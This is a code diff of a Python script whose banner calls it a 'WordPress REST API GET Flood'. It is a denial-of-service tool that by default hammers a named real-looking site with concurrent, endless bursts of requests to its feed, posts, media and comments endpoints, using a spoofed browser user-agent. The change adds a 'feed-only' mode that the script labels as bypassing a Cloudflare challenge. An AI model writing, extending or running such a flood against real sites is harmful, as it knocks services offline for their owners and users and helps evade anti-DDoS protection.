@@ -17,22 +17,30 @@ ap.add_argument("--target",      default="metoo-buffalo.com")
 ap.add_argument("--concurrency", type=int, default=30)
 ap.add_argument("--timeout",     type=int, default=20)
 ap.add_argument("--bursts",      type=int, default=0, help="0 = infinite")
+ap.add_argument("--feed-only",   action="store_true", help="feed endpoints only (bypasses CF challenge)")
 args = ap.parse_args()
 
 domain = args.target.replace("https://","").replace("http://","").strip("/")
 BASE   = f"https://{domain}"
 
-ENDPOINTS = [
+FEED_ENDPOINTS = [
+    BASE + "/feed/?paged=1",
+    BASE + "/feed/?paged=2",
+    BASE + "/feed/?paged=3",
+    BASE + "/feed/?paged=4",
+    BASE + "/feed/?paged=5",
+]
+
+REST_ENDPOINTS = [
     BASE + "/wp-json/wp/v2/posts?per_page=100",
     BASE + "/wp-json/wp/v2/media?per_page=100",
     BASE + "/wp-json/wp/v2/comments?per_page=100",
     BASE + "/wp-json/wp/v2/posts?per_page=100&page=2",
     BASE + "/wp-json/wp/v2/posts?per_page=100&_embed=1",
     BASE + "/wp-json/wp/v2/media?per_page=100&page=2",
-    BASE + "/feed/?paged=1",
-    BASE + "/feed/?paged=2",
-    BASE + "/feed/?paged=3",
 ]
+
+ENDPOINTS = FEED_ENDPOINTS if args.feed_only else FEED_ENDPOINTS + REST_ENDPOINTS
 
 HEADERS = {
     "User-Agent":        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
@@ -83,7 +91,8 @@ print(f"\n{B}{'='*68}{W}")
 print(f"  get_burst — WordPress REST API GET Flood")
 print(f"{'='*68}")
 print(f"  Target      : {BASE}")
-print(f"  Endpoints   : {len(ENDPOINTS)} rotating (posts/media/comments/feed)")
+ep_mode = "feed only (CF bypass)" if args.feed_only else "feed + REST (posts/media/comments)"
+print(f"  Endpoints   : {len(ENDPOINTS)} rotating ({ep_mode})")
 print(f"  Concurrency : {args.concurrency}")
 print(f"  Mode        : Continuous until Ctrl+C")
 print(f"{B}{'='*68}{W}\n")
